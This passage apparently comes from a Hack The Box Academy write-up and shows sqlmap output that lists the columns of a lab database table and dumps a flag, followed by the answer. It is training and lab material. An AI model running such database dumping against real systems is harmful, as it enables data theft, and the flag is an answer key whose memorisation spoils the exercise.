[09:36:44] [INFO] fetching columns for table 'flag11' in database 'testdb'
[09:36:44] [INFO] retrieved: 2
[09:36:46] [INFO] retrieved: id
[09:36:50] [INFO] retrieved: content
[09:37:01] [INFO] fetching entries for table 'flag11' in database 'testdb'
[09:37:01] [INFO] fetching number of entries for table 'flag11' in database 'testdb'
[09:37:01] [INFO] retrieved: 1
[09:37:03] [INFO] retrieved: HTB{5p3c14l_ch4r5_n0_m0r3}
[09:37:51] [INFO] retrieved: 1
Database: testdb
Table: flag11
[1 entry]
+----+----------------------------+
| id | content                    |
+----+----------------------------+
| 1  | HTB{5p3c14l_ch4r5_n0_m0r3} |
+----+----------------------------+

[09:37:54] [INFO] table 'testdb.flag11' dumped to CSV file '/home/htb-ac-2162140/.local/share/sqlmap/output/154.57.164.82/dump/testdb/flag11.csv'
[09:37:54] [INFO] fetched data logged to text files under '/home/htb-ac-2162140/.local/share/sqlmap/output/154.57.164.82'
[09:37:54] [WARNING] your sqlmap version is outdated

[*] ending @ 09:37:54 /2026-09-09/
```

**Answer:** `HTB{5p3c14l_ch4r5_n0_m0r3}`

---


[Back to Module Index](./README.md)
